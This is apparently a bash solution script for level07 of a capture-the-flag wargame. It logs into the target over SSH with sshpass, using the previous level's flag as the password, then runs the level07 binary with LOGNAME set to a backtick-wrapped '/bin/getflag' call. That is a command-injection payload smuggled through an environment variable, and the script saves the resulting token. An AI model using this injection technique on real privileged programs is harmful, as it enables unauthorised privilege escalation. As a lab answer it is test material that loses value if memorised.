#!/usr/bin/env bash

if [ "$(dirname "$0")" == "." ]; then
	ROOT_DIR=$(dirname $(dirname $PWD))
else
	ROOT_DIR=$(dirname $(dirname $(dirname "$0")))
fi

SCRIPT=$(cat <<EOF
LOGNAME='\`/bin/getflag\`'; ./level07 | awk '{print $NF}'
EOF
)

if [ ! -z "$1" ]; then
	PASS=$(sshpass -p $(cat $ROOT_DIR/level06/flag) ssh level07@$1 -p 4242 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag07.pwd
else
	echo "Usage: ./flag07.sh <ip address>"
fi
